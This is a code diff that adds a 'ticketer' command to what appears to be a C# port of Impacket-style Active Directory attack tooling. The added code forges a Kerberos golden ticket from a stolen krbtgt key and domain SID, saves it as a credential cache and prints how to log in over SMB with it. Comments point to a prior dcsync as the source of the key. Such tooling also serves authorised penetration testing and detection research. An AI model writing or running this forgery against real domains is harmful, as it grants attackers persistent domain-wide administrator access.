@@ -2465,6 +2465,47 @@ switch (args[0])
     case "getpac":
         return GetPac.Run(args);
 
+    case "ticketer":
+    {
+        // ticketer.py (golden ticket): forge a TGT from the domain krbtgt key. No network — it mints a
+        // ccache you then use with -k. Get the krbtgt key + domain SID from a prior dcsync of krbtgt.
+        const string tkUsage =
+            "usage: ticketer <domain-fqdn> <netbios-domain> <domain-sid> <username> <krbtgt-key-hex> [user-rid=500] [-save-ccache file]\n" +
+            "  krbtgt-key-hex: 64 hex = AES-256 (etype 18); 32 hex = RC4/NT-hash (etype 23)\n" +
+            "  e.g. ticketer lab.local LAB S-1-5-21-... Administrator <krbtgt-aes256-hex> -save-ccache golden.ccache";
+        if (args.Length < 6)
+        {
+            Console.Error.WriteLine(tkUsage);
+            return 2;
+        }
+
+        string realmFqdn = args[1];
+        string netbios = args[2];
+        string domainSid = args[3];
+        string tkUser = args[4];
+        string keyHex = args[5].Trim();
+        uint userRid = args.Length > 6 && uint.TryParse(args[6], out uint rid) ? rid : 500u;
+
+        if (keyHex.Length is not (32 or 64) || !keyHex.All(Uri.IsHexDigit))
+        {
+            Console.Error.WriteLine("krbtgt-key-hex must be 32 hex chars (RC4/NT hash) or 64 (AES-256).");
+            return 2;
+        }
+
+        byte[] krbtgtKey = Convert.FromHexString(keyHex);
+        int tkEtype = keyHex.Length == 64 ? Krb5Constants.Aes256CtsHmacSha1 : Krb5Constants.Rc4Hmac;
+
+        ForgedTicket forged = GoldenTicket.ForgeGolden(realmFqdn, netbios, domainSid, tkUser, userRid, krbtgtKey, tkEtype);
+        string outPath = GlobalOptions.SaveCcachePath ?? $"{tkUser}.ccache";
+        File.WriteAllBytes(outPath, forged.Ccache);
+
+        Console.WriteLine(forged.Summary);
+        Console.WriteLine();
+        Console.WriteLine($"Wrote ccache: {outPath} ({forged.Ccache.Length} bytes)");
+        Console.WriteLine($"Use it:  KRB5CCNAME={outPath} dotnetpacket smb2-login '{realmFqdn}/{tkUser}@<dc-host>' -k");
+        return 0;
+    }
+
     case "dcsync":
         return DcSync.Run(args);
 
